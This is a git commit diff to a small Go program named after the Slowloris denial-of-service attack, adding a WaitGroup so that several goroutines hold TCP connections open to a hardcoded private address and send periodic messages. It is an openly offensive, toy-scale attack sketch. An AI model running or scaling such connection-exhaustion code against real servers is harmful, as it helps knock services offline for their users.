eb575a6ddf50d9a55b91aeb7119b132ae7ee0898
batfolx <victorvelea007@yahoo.com>
2020-03-03 16:19:21 -0500

    added waitgroup

--- slowloris.go
+++ slowloris.go
@@ -7,46 +7,49 @@ import (
   "runtime"
 	"strconv"
 	"strings"
+  "time"
+  "sync"
 )
-
 
 
 func main() {
 
 
-  host_addr := "192.168.1.16:22" // replace this with whatever server you're trying to hit
+  host_addr := "172.30.5.220:45000"// replace this with whatever server you're trying to hit
   network := "tcp4"
-
-  for i := 0; i < 2; i++ {
-
-    go SlowLoris(host_addr, network, 0)
-
+  num_connections := 3
+  seconds := 1
+  var wg sync.WaitGroup
+  for i := 0; i < num_connections; i++ {
+    wg.Add(1)
+    go SlowLoris(host_addr, network, seconds, &wg)
 
   }
-  for {
+  wg.Wait()
 
-    fmt.Println("Go routines ended!")
-  }
 
 }
 
 
-func SlowLoris(host_addr string, network string, seconds int) {
+func SlowLoris(host_addr string, network string, seconds int, wg *sync.WaitGroup) {
 
   conn, err := net.Dial(network, host_addr)
   defer conn.Close()
+  defer wg.Done()
   if err != nil {
     fmt.Println(err)
   }
 
   for {
 
-    _, err := conn.Write([]byte("Alive..."))
+    _, err := conn.Write([]byte(fmt.Sprintf("Alive... from %d", goid())))
     fmt.Printf("Wrote to socket in this goroutine, %d\n", goid())
     if err != nil {
       fmt.Println(err)
+      return
     }
 
+    time.Sleep(time.Duration(seconds) * time.Second)
   }
   fmt.Println("Done with goroutine.")
 
